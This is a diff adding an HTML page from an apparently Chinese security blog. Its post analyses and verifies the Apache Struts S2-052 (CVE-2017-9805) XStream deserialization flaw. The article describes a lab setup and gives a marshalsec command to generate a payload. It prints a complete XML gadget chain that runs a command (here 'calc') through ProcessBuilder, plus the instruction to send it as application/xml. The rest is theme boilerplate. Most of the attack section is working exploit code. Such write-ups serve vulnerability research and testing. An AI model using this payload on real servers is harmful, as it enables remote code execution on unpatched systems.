@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>S2-052漏洞分析与验证 | sm0nk&#39;s blog</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="基本信息漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。">
+<meta name="keywords" content="struts2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="S2-052漏洞分析与验证">
+<meta property="og:url" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/index.html">
+<meta property="og:site_name" content="sm0nk&#39;s blog">
+<meta property="og:description" content="基本信息漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。">
+<meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/s2.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/show.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/avil.png">
+<meta property="og:updated_time" content="2017-09-12T15:27:41.863Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="S2-052漏洞分析与验证">
+<meta name="twitter:description" content="基本信息漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。">
+<meta name="twitter:image" content="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/s2.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sm0nk&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+
+  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+  
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/kongfu.gif" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">sm0nk</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/categories/渗透测试/">渗透测试</a></li>
+				        
+							<li><a href="/categories/编程之道/">编程之道</a></li>
+				        
+							<li><a href="/categories/编程之道/">精品阅读</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="mail" target="_blank" href="mailto:sm0nk@qq.com" title="mail">mail</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/shellr00t" title="weibo">weibo</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/pentest/" style="font-size: 10px;">pentest</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/struts2/" style="font-size: 10px;">struts2</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">sm0nk</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/kongfu.gif" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">sm0nk</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/categories/渗透测试/">渗透测试</a></li>
+		        
+					<li><a href="/categories/编程之道/">编程之道</a></li>
+		        
+					<li><a href="/categories/编程之道/">精品阅读</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="mail" target="_blank" href="mailto:sm0nk@qq.com" title="mail">mail</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/shellr00t" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-S2-052漏洞分析与验证" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/09/12/S2-052漏洞分析与验证/" class="article-date">
+  	<time datetime="2017-09-12T15:17:46.000Z" itemprop="datePublished">2017-09-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      S2-052漏洞分析与验证
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/struts2/">struts2</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透测试-漏洞分析/">渗透测试,漏洞分析</a>
+	</div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12, Struts 2.x<br>漏洞概述：问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。</p>
+<a id="more"></a>
+<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>tomcat部署 war<br>从struts2的官网下载最后受影响的版本struts-2.5.12，地址：<br><a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a><br>注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br><img src="s2.png" alt=""></p>
+<p>默认配置server.xml 默认不变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</div><div class="line">unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;</div><div class="line">xmlValidation=&quot;false&quot; xmlNamespaceAware=&quot;false&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>直接使用jspstudy 不可以，有可能精简过环境。新搭建的tomcat9 没有问题</p>
+<h1 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-<span class="number">0.0</span>.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc &gt; <span class="number">1</span>.txt</div></pre></td></tr></table></figure>
+<p>payload, 目前此payload为windows 开启calc 计算器弹窗的。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">command</span>&gt;</span></div><div class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="name">next</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></div><div class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></div><div class="line">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></div><div class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></div><div class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></div><div class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="show.png" alt=""></p>
+<p>需要更改Content-Type类型为application/xml</p>
+<p><img src="avil.png" alt=""></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/09/08/渗透测试/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">渗透测试</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="S2-052漏洞分析与验证" data-title="S2-052漏洞分析与验证" data-url="http://yoursite.com/2017/09/12/S2-052漏洞分析与验证/"  data-images="/img/kongfu.gif" data-content="S2-052漏洞分析与验证">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2017 sm0nk
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="/js/main.js"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
